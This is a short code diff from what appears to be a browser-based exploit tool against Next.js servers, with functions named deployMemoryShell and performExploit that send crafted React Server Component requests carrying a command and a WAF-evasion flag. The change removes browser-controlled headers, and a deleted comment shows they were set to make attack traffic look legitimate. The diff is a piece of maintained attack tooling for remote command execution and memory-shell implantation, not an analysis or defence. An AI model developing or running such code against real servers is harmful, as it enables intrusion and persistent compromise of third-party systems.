@@ -139,15 +139,10 @@ async function deployMemoryShell(wafEnabled) {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', url, true);
                 
-                // Normal browser headers first (to look like legitimate request)
+                // Normal browser headers (only safe headers that can be set manually)
+                // Note: Accept-Encoding, Referer, Origin, Sec-Fetch-* are browser-controlled and cannot be set
                 xhr.setRequestHeader('Accept', '*/*');
                 xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
-                xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
-                xhr.setRequestHeader('Referer', window.location.href);
-                xhr.setRequestHeader('Origin', window.location.origin);
-                xhr.setRequestHeader('Sec-Fetch-Dest', 'empty');
-                xhr.setRequestHeader('Sec-Fetch-Mode', 'cors');
-                xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
                 
                 // Next.js specific headers (required for RSC)
                 xhr.setRequestHeader('Next-Action', 'x');
@@ -362,15 +357,10 @@ async function performExploit(cmd, wafEnabled) {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', url, true);
                 
-                // Normal browser headers first (to look like legitimate request)
+                // Normal browser headers (only safe headers that can be set manually)
+                // Note: Accept-Encoding, Referer, Origin, Sec-Fetch-* are browser-controlled and cannot be set
                 xhr.setRequestHeader('Accept', '*/*');
                 xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
-                xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
-                xhr.setRequestHeader('Referer', window.location.href);
-                xhr.setRequestHeader('Origin', window.location.origin);
-                xhr.setRequestHeader('Sec-Fetch-Dest', 'empty');
-                xhr.setRequestHeader('Sec-Fetch-Mode', 'cors');
-                xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
                 
                 // Next.js specific headers (required for RSC)
                 xhr.setRequestHeader('Next-Action', 'x');
